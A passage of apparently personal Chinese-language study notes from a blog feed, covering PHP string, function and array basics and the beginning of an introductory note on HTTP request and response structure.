class="string">&quot;b&quot;</span>); <span class="comment">// =&gt; 返回:bbfa1dsxf</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strstr</span>(<span class="string">&quot;adbbfa1dsxf&quot;</span>, <span class="string">&quot;b&quot;</span>,<span class="literal">true</span>); <span class="comment">// =&gt; 返回:ad</span></span><br></pre></td></tr></table></figure><h2 id="字符串替换函数"><a href="#字符串替换函数" class="headerlink" title="字符串替换函数"></a>字符串替换函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 替换字符串,且是所有的合适的字符串.</span></span><br><span class="line"><span class="comment">// search参数用于   指定要替换的字符串；</span></span><br><span class="line"><span class="comment">// replace参数用于  指定替换后的字符串；</span></span><br><span class="line"><span class="comment">// subject参数用于  指定要替换的字符串，如果是数组，会遍历整个数组进行替换，返回值也是一个数组</span></span><br><span class="line"><span class="comment">// 前三个参数，都可以传入数组！</span></span><br><span class="line"><span class="comment">// count参数用于   统计替换了多少次</span></span><br><span class="line"><span class="title function_ invoke__">str_replace</span>(search，replace，subject[,count])</span><br><span class="line"><span class="comment">// 简单演示如下</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;你好&quot;</span>, <span class="string">&quot;真的非常感谢这个&quot;</span>, <span class="string">&quot;你好世界!&quot;</span>); </span><br><span class="line"><span class="comment">// 输出:真的非常感谢这个世界!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 同时修改多个参数的办法：</span></span><br><span class="line"><span class="comment">// 也可以使用数组,这样子就可以修改多个参数了</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;12345,咱一起学习吧!12345,不要放弃呀!&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>), <span class="keyword">array</span>(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>), <span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// 返回:cdef5,咱一起学习吧!cdef5,不要放弃呀!</span></span><br></pre></td></tr></table></figure><h2 id="与html标签相关的函数"><a href="#与html标签相关的函数" class="headerlink" title="与html标签相关的函数"></a>与html标签相关的函数</h2><p>主要的转换规则如下：</p><blockquote><p>&amp; (和号)   成为 &amp;<br>&quot; (双引号) 成为 &quot;<br>&#39; (单引号) 成为 &#039;<br>&lt; (小于)   成为 &lt;<br>&gt; (大于)   成为 &gt;</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// htmlspecialchars()</span></span><br><span class="line"><span class="comment">// 差不多就是让html的一些字符不被正常的解析，显示出原来的样子</span></span><br><span class="line"><span class="variable">$str4</span> = <span class="string">&lt;&lt;&lt;START</span></span><br><span class="line"><span class="string">&lt;p style=&quot;color:red;font-size:30px&quot;&gt;我们的努力是有意义的！&lt;/p&gt;</span></span><br><span class="line"><span class="string">START</span>;</span><br><span class="line"><span class="comment">// 普通的返回</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str4</span> . <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line"><span class="comment">// 转换后的返回，不会被解析为对应的标签效果</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str4</span>) . <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面是来自vscode的回显效果</span></span><br><span class="line">&lt;p style=<span class="string">&quot;color:red;font-size:30px&quot;</span>&gt;我们的努力是有意义的！&lt;/p&gt;&lt;br&gt;</span><br><span class="line">&amp;lt;p style=&amp;quot;color:red;font-size:<span class="number">30</span>px&amp;quot;&amp;gt;我们的努力是有意义的！&amp;lt;/p&amp;gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// strip_tags()</span></span><br><span class="line"><span class="comment">// 去除字符串当中的xml/html/php标签</span></span><br><span class="line"><span class="comment">// string:字符串</span></span><br><span class="line"><span class="comment">// allow :白名单，规定不去除某标签。</span></span><br><span class="line"><span class="title function_ invoke__">strip_tags</span>(<span class="keyword">string</span>,allow)</span><br><span class="line"><span class="comment">// 如下1：</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strip_tags</span>(<span class="string">&quot;&lt;d&gt;&lt;a&gt;&lt;/a&gt;&lt;input&gt;112123&lt;/d&gt;&lt;strong&gt;你好&lt;/strong&gt;&quot;</span>, <span class="string">&quot;&lt;d&gt;&lt;a&gt;&quot;</span>) . <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line"><span class="comment">// 返回112123你好&lt;br&gt;</span></span><br><span class="line"><span class="comment">// 如下2：</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strip_tags</span>(<span class="string">&quot;&lt;d&gt;&lt;a&gt;&lt;/a&gt;&lt;input&gt;112123&lt;/d&gt;&lt;strong&gt;你好&lt;/strong&gt;&quot;</span>, <span class="string">&quot;&lt;d&gt;&lt;a&gt;&lt;strong&gt;&quot;</span>) . <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line"><span class="comment">// 返回&lt;d&gt;&lt;a&gt;&lt;/a&gt;112123&lt;/d&gt;&lt;strong&gt;你好&lt;/strong&gt;&lt;br&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 综上所述，根据观察得出，白名单必须是带顺序的过滤，否则会报错</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="字符串截取函数"><a href="#字符串截取函数" class="headerlink" title="字符串截取函数"></a>字符串截取函数</h2><p>参数说明（取自菜鸟教程）</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>string</td><td>必需。规定要返回其中一部分的字符串。</td></tr><tr><td>start</td><td>必需。规定在字符串的何处开始。<br> + 正数 - 在字符串的指定位置开始<br> + 负数 - 在从字符串结尾的指定位置开始 <br> + 0 - 在字符串中的第一个字符处开始</td></tr><tr><td>length</td><td>可选。规定要返回的字符串长度。默认是直到字符串的结尾。<br> + 正数 - 从 start 参数所在的位置返回 <br> + 负数 - 从字符串末端返回</td></tr></tbody></table><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">substr</span>(<span class="keyword">string</span>,start,length);</span><br></pre></td></tr></table></figure><h2 id="字符串分隔函数"><a href="#字符串分隔函数" class="headerlink" title="字符串分隔函数"></a>字符串分隔函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">explode</span>(separator,<span class="keyword">string</span>[,limit]);</span><br><span class="line"><span class="comment">// 使用一个字符串来分割另一个字符串</span></span><br><span class="line"><span class="comment">// separator ：用什么字符串来分割</span></span><br><span class="line"><span class="comment">// string    ：原始字符串（被分割的字符串）</span></span><br><span class="line"><span class="comment">// [,limit]  ：[正：返回最多limt个元素的数组；负：返回除了-limt以外的所有元素的数组；0：返回包含1个元素的数组]</span></span><br><span class="line"><span class="comment">// 如下</span></span><br><span class="line"><span class="comment">//  返回包含一个元素的数组</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$str</span>,<span class="number">0</span>));</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 数组元素为 2</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$str</span>,<span class="number">2</span>));</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 删除最后一个数组元素</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$str</span>,-<span class="number">2</span>));</span><br><span class="line"><span class="comment">// -------</span></span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; one,two,three,four</span><br><span class="line">)</span><br><span class="line">&lt;br&gt;<span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; one</span><br><span class="line">    [<span class="number">1</span>] =&gt; two,three,four</span><br><span class="line">)</span><br><span class="line">&lt;br&gt;<span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; one</span><br><span class="line">    [<span class="number">1</span>] =&gt; two</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">str_split</span>(<span class="keyword">string</span>,length);</span><br><span class="line"><span class="comment">// 将字符串转换为数组</span></span><br><span class="line"><span class="comment">// 将字符串string分割成每个元素为length长的字符串数组。</span></span><br><span class="line"><span class="comment">// 如下</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">str_split</span>(<span class="string">&quot;hello,world&quot;</span>, <span class="number">3</span>));</span><br><span class="line"><span class="comment">// 结果</span></span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; hel</span><br><span class="line">    [<span class="number">1</span>] =&gt; lo,</span><br><span class="line">    [<span class="number">2</span>] =&gt; wor</span><br><span class="line">    [<span class="number">3</span>] =&gt; ld</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p><strong>字符串函数</strong> 还有很多,具体还得看需求，届时自己学习即可。</p>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习日志-003</title>
      <link href="/2023/02/23/PHP-Study-003/"/>
      <url>/2023/02/23/PHP-Study-003/</url>
      
        <content type="html"><![CDATA[<p>函数，数组</p><span id="more"></span><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="自定义函数"><a href="#自定义函数" class="headerlink" title="自定义函数"></a>自定义函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> 函数名(<span class="params">[形参列表]</span>) </span>&#123;</span><br><span class="line">    函数体;</span><br><span class="line">    <span class="keyword">return</span> 表达式; <span class="comment">//可以写可以不写，看实际需要</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用函数(可以直接使用函数)</span></span><br><span class="line"><span class="variable">$a</span> = 函数名(实际参数);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数参数(可以传，也可以不传，看实际需要)</span></span><br><span class="line"><span class="comment">// 假设有变量$a=10</span></span><br><span class="line"><span class="variable">$a</span>=<span class="number">10</span>;</span><br><span class="line"><span class="comment">// 按值传参：不会修改到外部$a的值</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stuPHP1</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> ++<span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 按引用传参: (个人理解 -&gt; 传地址)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stuPHP2</span>(<span class="params">&amp;<span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> ++<span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 默认参数: </span></span><br><span class="line"><span class="comment">// 调用时不传入参数，就使用默认的参数值</span></span><br><span class="line"><span class="comment">// 添加的默认参数必须从右往左加</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stuPHP3</span>(<span class="params"><span class="variable">$a</span>=<span class="number">300</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> ++<span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 可变长度参数列表</span></span><br><span class="line"><span class="comment">// PHP提供的，可以直接使用</span></span><br><span class="line"><span class="title function_ invoke__">func_get_args</span>();    <span class="comment">// 将传入的参数转换为一个列表</span></span><br><span class="line"><span class="title function_ invoke__">func_get_arg</span>(下标);  <span class="comment">// 将传入的参数转换为一个列表，但会获取指定下标的参数值</span></span><br><span class="line"><span class="title function_ invoke__">func_num_args</span>();    <span class="comment">// 返回传入参数的个数</span></span><br></pre></td></tr></table></figure><h2 id="变量范围"><a href="#变量范围" class="headerlink" title="变量范围"></a>变量范围</h2><blockquote><p><strong>局部变量</strong> ：函数内定义，作用域仅限于函数内。<br><strong>全局变量</strong> ：函数外部定义，作用域在定义开始至程序文件尾。<br><strong>静态变量</strong> ：static定义的内部变量，仅第一次调用时初始化,第二次调用时不会初始化(也就是值和上次调用结束时相同)</p></blockquote><h2 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h2><p>函数名字带上引号，赋值给变量即可。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stuPHP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Hello PHP!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;stuPHP&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>();   <span class="comment">// =&gt; 相当于stuPHP();</span></span><br></pre></td></tr></table></figure><h2 id="递归函数"><a href="#递归函数" class="headerlink" title="递归函数"></a>递归函数</h2><p>自己调用自己。</p><p><img src="c-01.jpg" alt="递归"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$strs</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stuPHP</span>(<span class="params"><span class="variable">$n</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$n</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">stuPHP</span>(<span class="variable">$n</span> - <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$strs</span> .= (<span class="keyword">string</span>)<span class="variable">$n</span> . <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;------------------------&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$strs</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="number">10</span>;</span><br><span class="line"><span class="title function_ invoke__">stuPHP</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">// 网页端输出结果：</span></span><br><span class="line">------------------------<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">7</span> <span class="number">8</span> <span class="number">9</span> <span class="number">10</span></span><br></pre></td></tr></table></figure><p>如果不解，可以看看Java那篇日志的递归，原理是共通的。</p><h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><p>php提供我们现成的函数或结构。有些函数需要开启扩展模块才能使用。</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="数组的分类"><a href="#数组的分类" class="headerlink" title="数组的分类"></a>数组的分类</h2><blockquote><p>索引数组是按照数字索引来存储数据的数组<br>关联数组是按照字符串索引来存储数据的数组<br>多维数组是按照多个索引来存储数据的数组</p></blockquote><h2 id="数组创建"><a href="#数组创建" class="headerlink" title="数组创建"></a>数组创建</h2><p>不用指定大小，不用声明，可以存储任何类型数据。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">说明：组成如下，值<span class="number">1</span>可以是任何类型，也可以是数组。</span><br><span class="line">键名可以是整数，也可以是字符串。但默认的键名是从<span class="number">0</span>开始的整数。</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(键名<span class="number">1</span>=&gt;值<span class="number">1</span>,键名<span class="number">2</span>=&gt;值<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">当键值是一维数组时，和套着它们的一维数组合起来，就称为二维数组。</span><br><span class="line">当然，这个数组的维度可以自己叠加，看你实际的生产需要。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 创建数组arr1</span></span><br><span class="line"><span class="comment">// 没写键名/索引值，默认为从0开始的整数。</span></span><br><span class="line"><span class="variable">$arr1</span> = <span class="keyword">array</span>(<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>);</span><br><span class="line"><span class="comment">// 相当于创建数组：arr2 = array(0=&gt;11,1=&gt;12,2=&gt;13)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建数组arr2</span></span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">0</span>] = <span class="number">123</span>;</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">1</span>] = <span class="number">456</span>;</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">2</span>] = <span class="number">789</span>;</span><br><span class="line"><span class="variable">$arr2</span>[<span class="number">3</span>] = <span class="number">101</span>;</span><br><span class="line"><span class="comment">// 相当于创建数组：arr2 = array(0=&gt;123,1=&gt;456,2=&gt;789,3=&gt;101)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建数组arr3</span></span><br><span class="line"><span class="comment">// 索引值会默认从0开始</span></span><br><span class="line"><span class="variable">$arr2</span>[] = <span class="number">123</span>;</span><br><span class="line"><span class="variable">$arr2</span>[] = <span class="number">456</span>;</span><br><span class="line"><span class="variable">$arr2</span>[] = <span class="number">789</span>;</span><br><span class="line"><span class="variable">$arr2</span>[] = <span class="number">101</span>;</span><br><span class="line"><span class="comment">// 相当于创建数组：arr3 = array(0=&gt;123,1=&gt;456,2=&gt;789,3=&gt;101)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出数组值的办法</span></span><br><span class="line"><span class="keyword">echo</span> arr[键名];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 遍历方法1</span></span><br><span class="line"><span class="comment">// 如果是使用整数遍历数组，获取数组的大小+使用for循环输出即可</span></span><br><span class="line"><span class="comment">// count(arr[,num]):返回数组的元素个数,num不选择默认为0，遍历到第一层过。</span></span><br><span class="line"><span class="comment">// 如果num为n，那么返回的值就是：第一层的元素个数+第二层的元素个数+...+第n层的元素个数</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span>=<span class="number">0</span>;<span class="variable">$a</span>&lt;<span class="title function_ invoke__">count</span>(arr1);<span class="variable">$a</span>++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> arr1[<span class="variable">$a</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历方法2</span></span><br><span class="line"><span class="comment">// 如果说，遍历数组的键名不全是整数，就得使用另外一个方法：指针</span></span><br><span class="line"><span class="title function_ invoke__">next</span>(数组名);                   <span class="comment">//把指针指向下一个元素  </span></span><br><span class="line"><span class="title function_ invoke__">prev</span>(数组名);                   <span class="comment">//把指针指向上一个元素</span></span><br><span class="line"><span class="title function_ invoke__">reset</span>(数组名);                  <span class="comment">//把指针指向第一个元素</span></span><br><span class="line"><span class="title function_ invoke__">end</span>(数组名);                    <span class="comment">//把指针指向最后一个元素</span></span><br><span class="line"><span class="title function_ invoke__">key</span>(数组名);                    <span class="comment">//取数组当前元素的键名</span></span><br><span class="line"><span class="title function_ invoke__">each</span>(数组名);                   <span class="comment">//取数组当前元素的键名和值，并且把指针移向下一个元素</span></span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$var1</span>,<span class="variable">$var2</span>,<span class="variable">$var3</span>...)=arr;   <span class="comment">//把数组arr分别赋值给变量var1,var2,var3...</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$a</span>=<span class="number">0</span>;<span class="variable">$a</span>&lt;<span class="title function_ invoke__">count</span>(arr1);<span class="variable">$a</span>++)&#123;</span><br><span class="line">    <span class="title function_ invoke__">next</span>(arr1);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">key</span>(arr1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历方法3</span></span><br><span class="line"><span class="comment">// 直接获取变量的值来遍历</span></span><br><span class="line"><span class="keyword">foreach</span>(数组 <span class="keyword">as</span> 变量) &#123;</span><br><span class="line">    <span class="keyword">echo</span> 变量;<span class="comment">//变量存储的是数组的值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历方法4</span></span><br><span class="line"><span class="comment">// 键名是获取数组的键名</span></span><br><span class="line"><span class="comment">// 变量数获取数组的键值</span></span><br><span class="line"><span class="keyword">foreach</span>(数组 <span class="keyword">as</span> 键名=&gt;变量) &#123;</span><br><span class="line">    <span class="keyword">echo</span> 键名.<span class="string">&quot;:&quot;</span>.变量.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="预定义超全局数组变量"><a href="#预定义超全局数组变量" class="headerlink" title="预定义超全局数组变量"></a>预定义超全局数组变量</h2><p>全部作用域都可以使用。</p><blockquote><p>1)$GLOBALS<br>2)$_SERVER</p><blockquote><p>服务器变量，不同的web服务器可能会有不同的一些内容<br>3)$_GET<br>获取HTTP GET方式传递的参数,比如ur1或者表单GET方式传过来的参数<br>4)$_POST<br>获取HTTP POST方式传递的参数,比如表单POST方式传过来的参数<br>5)$_FILES<br>HTTP文件上传变量<br>6)$_COOKIE<br>7)$_SESSION<br>8)$_REQUEST<br>包含了$_GET,$_POST和$_COOKIE中的全部内容<br>9)$_ENV<br>环境变量和PHP所运行的环境有关若没有数据可能与php.ini配置项variables order配置项有关</p></blockquote></blockquote><h3 id="传递数据的方式-重要"><a href="#传递数据的方式-重要" class="headerlink" title="传递数据的方式(重要)"></a>传递数据的方式(重要)</h3><p>提交数据，给服务端主要的两种形式。</p><p>1.get方式</p><pre><code>比如：http://www.xxx.com/index.php?参数名1=参数值1&amp;参数名2=参数值2接收端接收数据时，使用$_GET(&quot;name&quot;)获取数据注意，这是明文传输的，保密性较低</code></pre><p>2.post方式</p><pre><code>传输的使用form使用post传输，无法在url框框看到。注意，这个传输保密比get高，稍微安全些。</code></pre><h2 id="处理数组的相关函数"><a href="#处理数组的相关函数" class="headerlink" title="处理数组的相关函数"></a>处理数组的相关函数</h2><ol><li>array_count_values(数组名)       :将数组的值作为键，并且将它们出现的次数作为值。</li><li>array_key_exists(键名,数组名)    :检测键名是否存在于数组中</li><li>array_search(“值”,数组名[,bool]) : 在数组搜索给定的值，存在=&gt;返回索引值(键名) ，不存在=&gt;false(4.4版本前为null).[,bool]部分默认为false，为true时需要匹配不仅仅是值，还有它的类型</li><li>count                           :返回数组元素个数</li><li>in_array(value,array,type)      :判断数组array是否存在指定值value，存在则返回true，反之false。type是类型</li><li>list                            :前面有提到一嘴，list是用来拆分数组的每个值到每个变量当中的。</li><li>asort                           :值升序，且键名与值的对应关系不变，与之相对的函数有：arsort</li><li>sort                            :值升序，且键名与值的对应关系变更为从0到n的整数，与之相对的函数有：rsort</li><li>array_filter（array，callback）  :过滤数组中的元素，只保留满足指定条件的元素</li><li>shuffle(数组名)                 :值顺序打乱，键名重置为0开始的整数</li><li>array_reverse(数组名[,key])     :  key=&gt;false(默认)数组倒过来排序；key=&gt;true数组保留原键名并且倒过来排序。</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEC-2022版-0000-http/https</title>
      <link href="/2023/02/22/SEC-Study-001/"/>
      <url>/2023/02/22/SEC-Study-001/</url>
      
        <content type="html"><![CDATA[<p>http，https</p><span id="more"></span><h1 id="http-URL-URI-URN"><a href="#http-URL-URI-URN" class="headerlink" title="http/URL/URI/URN"></a>http/URL/URI/URN</h1><h2 id="http连接流程-概念"><a href="#http连接流程-概念" class="headerlink" title="http连接流程/概念"></a>http连接流程/概念</h2><p>连接流程：</p><pre><code>客户端通过三次握手与服务器建立连接TCP建立连接后，        向服务器发送http请求服务器收到http请求后，  向客户端发送http响应客户端通过tcp四次挥手， 与服务器断开tcp连接可靠的链接交换信息无状态的请求/响应协议无状态协议阐释：HTTP（超文本传输协议）是一种无状态的请求/响应协议，这意味着服务器不会维护客户端请求的任何状态信息。每个 HTTP 请求都被视为独立的请求，因此在处理一个新请求时，服务器不会考虑前面的请求或上下文。拓展：两个架构C/S 客户端-服务器   HTTP TCP/IP FTPB/S 浏览器-服务器   HTTP HTML   AJAXhttp9.0/http1.0 每次连线请求/回应正确后关闭（完成一次关一次）http1.1         保持连线，一个连接可以多个请求/回应 =&gt; 节约握手时间</code></pre><h2 id="URL-统一资源定位符"><a href="#URL-统一资源定位符" class="headerlink" title="URL-统一资源定位符"></a>URL-统一资源定位符</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://    user:pass    @ www.example.jp:  80         /dir/index.htm  ?  uid=1       #ch1</span><br><span class="line">协议方案名  登录信息(认证)    服务器地址       服务器端口号  带层次的文件路径    查询字符串   片段字符串</span><br><span class="line">-------</span><br><span class="line">协议方案名：            http/ftp/file/mailto/telnet/ldap…… </span><br><span class="line">登录信息(认证):可选，    需要认证再填写此参数</span><br><span class="line">服务器地址:             ip地址或者域名(常见)</span><br><span class="line">服务器端口号：           指定服务器连接的端口号，不填则为默认端口号</span><br><span class="line">带层次的文件路径：        获取资源在服务器当中的具体位置</span><br><span class="line">查询字符串：             已指定路径资源，可查询字符串获取想要的参数</span><br><span class="line">片段字符串：             信息片段字符串，标记已获取资源的子资源。</span><br></pre></td></tr></table></figure><h2 id="URI与URN"><a href="#URI与URN" class="headerlink" title="URI与URN"></a>URI与URN</h2><p><strong>URI</strong> : 统一资源标志符, <strong>URL&lt;URI</strong><br><strong>URN</strong> ：统一资源名称，唯一名称或id标识资源。</p><h1 id="客户端请求消息-数据包"><a href="#客户端请求消息-数据包" class="headerlink" title="客户端请求消息-数据包"></a>客户端请求消息-数据包</h1><h2 id="http请求组成：（四部分）"><a href="#http请求组成：（四部分）" class="headerlink" title="http请求组成：（四部分）"></a>http请求组成：（四部分）</h2><blockquote><p><strong>请求行</strong><br><strong>请求头</strong><br><strong>空行</strong><br><strong>请求体</strong></p></blockquote><h2 id="请求行"><a href="#请求行" class="headerlink" title="请求行"></a>请求行</h2><p><strong>组成</strong> :</p><pre><code>Method          请求方法Request-URL     统一资源标识符HTTP-Version    HTTP协议版本CRLF            回车换行</code></pre><table><thead><tr><th>请求方法</th><th>释义</th></tr></thead><tbody><tr><td>GET</td><td>请求获取Request-URI所标识的资源</td></tr><tr><td>POsT</td><td>在Request-URI所标识的资源后附加新的数据</td></tr><tr><td>HEAD</td><td>请求获取由Request-URI所标识的资源的响应消息报头</td></tr><tr><td>PUT</td><td>请求服务器存储一个资源，并用Request-URI作为其标识</td></tr><tr><td>DELETE</td><td>请求服务器删除Request-URI所标识的资源</td></tr><tr><td>TRACE</td><td>请求服务器回送收到的请求信息，主要用于测试或诊断</td></tr><tr><td>OPTIONS</td><td>请求查询服务器的性能，或者查询与资源相关的选项和需求</td></tr><tr><td>CONNECT</td><td>保留将来使用，HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器</td></tr><tr><td>PATCH</td><td>用于将局部修改应用到资源· (由 RFC 5789 指定的方法)</td></tr></tbody></table><h3 id="请求头"><a href="#请求头" class="headerlink" title="请求头"></a>请求头</h3><p><img src="c-01.jpg" alt="请求头"></p><p>拓展：</p><blockquote><p>X-Forwarded-For:&lt;client&gt;,&lt;proxy1&gt;,&lt;proxy2&gt;</p><ul><li>代理，client是客户端地址，proxy是代理地址</li><li>作用：让服务端知道客户端请求的来源</li></ul></blockquote><h3 id="空行"><a href="#空行" class="headerlink" title="空行"></a>空行</h3><p>表示请求头结束，请求体开始。</p><h3 id="请求体"><a href="#请求体" class="headerlink" title="请求体"></a>请求体</h3><p>通常情况下， <strong>post</strong> 传输的数据就在请求体当中，而 <strong>get</strong> 传输的数据在请求行当中。<br>且get是以 <strong>&amp;</strong> 作为分隔。post也有使用 <strong>&amp;</strong> 作为分隔。</p><h1 id="服务器响应消息-数据包"><a href="#服务器响应消息-数据包" class="headerlink" title="服务器响应消息-数据包"></a>服务器响应消息-数据包</h1><p>http响应组成</p><ul><li><strong>状态行</strong></li><li><strong>消息报头</strong></li><li><strong>空行</strong></li><li><strong>响应正文</strong></li></ul><p>和请求最明显不一样的，是状态行，其他没什么大不同</p><h2 id="状态行"><a href="#状态行" class="headerlink" title="状态行"></a>状态行</h2><pre><code>协议版本 状态码 状态码描述</code></pre><p>状态码</p><pre><code>状态代码有三位数字组成，第一个数字定义了响应的类别·且有五种可能取值1xx: 指示信息--请求已被服务器接收·继续处理2xx: 成功--请求已成功被服务器接收、理解、并接受3xx: 